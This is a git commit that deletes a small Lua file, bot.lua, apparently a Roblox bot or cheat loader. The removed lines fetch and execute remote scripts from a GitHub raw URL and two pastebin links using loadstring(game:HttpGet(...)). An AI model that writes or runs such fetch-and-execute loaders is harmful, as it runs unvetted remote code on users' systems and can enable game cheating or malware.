893c7f2bb26a065e517763a43ac6315fc1e34a30
tonpereaveclelait <antriwassim18@gmail.com>
2026-06-30 12:45:26 +0100

    Delete bot.lua

--- bot.lua
+++
@@ -1,5 +0,0 @@
-getgenv().CONFIG = { main = "username here" }
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Bucknbilly/scripts/refs/heads/main/Banana.lua"))()
-loadstring(game:HttpGet("https://pastebin.com/raw/15ARDqjY"))()
-loadstring(game:HttpGet("https://pastebin.com/raw/xuL0gvHU"))()
